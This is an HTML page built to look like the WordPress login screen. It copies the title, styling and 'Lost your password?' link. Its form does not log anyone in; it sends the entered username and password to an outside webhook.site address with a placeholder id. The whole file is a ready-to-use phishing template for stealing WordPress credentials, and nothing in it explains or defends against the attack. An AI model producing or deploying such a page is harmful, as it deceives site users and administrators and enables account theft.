<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Log In ‹ WordPress</title>
  <link rel="stylesheet" href="https://s.w.org/style/login.css">
</head>
<body style="background:#f1f1f1; font-family:sans-serif;">
  <div style="max-width: 320px; margin: 100px auto; padding: 40px; background: white; border: 1px solid #ddd;">
    <h1 style="text-align:center;">WordPress</h1>
    <form action="https://webhook.site/YOUR-UNIQUE-ID" method="POST">
      <label for="user_login">Username or Email Address</label><br>
      <input type="text" name="username" required style="width:100%; padding:8px; margin-top:5px;"><br><br>
      <label for="user_pass">Password</label><br>
      <input type="password" name="password" required style="width:100%; padding:8px; margin-top:5px;"><br><br>
      <input type="submit" value="Log In" style="width:100%; padding:8px; background:#2271b1; color:white; border:none;">
    </form>
    <p style="text-align:center; margin-top:15px;"><a href="#">Lost your password?</a></p>
  </div>
</body>
</html>
